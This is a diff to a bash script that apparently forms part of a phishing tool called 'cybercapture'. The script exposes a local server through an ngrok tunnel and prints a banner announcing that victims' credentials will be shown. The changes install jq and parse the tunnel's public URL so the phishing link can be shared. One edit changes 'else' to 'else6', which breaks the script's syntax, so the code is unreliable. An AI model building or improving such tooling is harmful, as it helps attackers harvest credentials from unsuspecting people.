@@ -6,6 +6,18 @@ mkdir ${HOME}/cybercapture
 fi
 OS=$(uname -o)
 distro=$(cd $HOME && pwd)
+case ${OS} in
+Android)
+	if ! hash jq > /dev/null 2>&1; then
+	apt install jq -y > /dev/null 2>&1
+	fi
+;;
+GNU/Linux)
+	if ! hash jq > /dev/null 2>&1; then
+        sudo apt install jq -y > /dev/null 2>&1
+        fi
+;;
+esac
 wait() {
 sleep 0.02
 }
@@ -112,7 +124,7 @@ echo
 if [[ ${OS^^} == *'ANDROID'* ]]; then
      if [[ ${distro} == *'com.termux'* ]]; then
          termux-chroot ngrok http 3333 > /dev/null 2>&1 &
-     else
+     else6
          while true; do
          printf "${S2}[${S1}!${S2}]${S1} Please switch on your mobile hotspot :/${R0}\n"
 	 echo
@@ -130,7 +142,12 @@ else
      sudo ngrok http 3333 > /dev/null 2>&1 &
 fi
 sleep 5
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+#link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+r1=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq -r | grep public_url | awk '{print $2}')
+r2=$(printf "${r1/\"http:\/\//}")
+r3=$(printf "${r2/\"https:\/\//}")
+r4=$(printf "${r3/\",/}")
+link=$(printf "${r4/%\",/}")
 echo; wait
 printf "${S7}<<<${R0}${S1}---------------${R0}${B1}${S7}VICTIM'S CRIDENTIALS WILL BE SHOWN HERE${R0}${G0}${S1}---------------${R0}${S7}>>>${R0}\n"; wait
 echo; wait
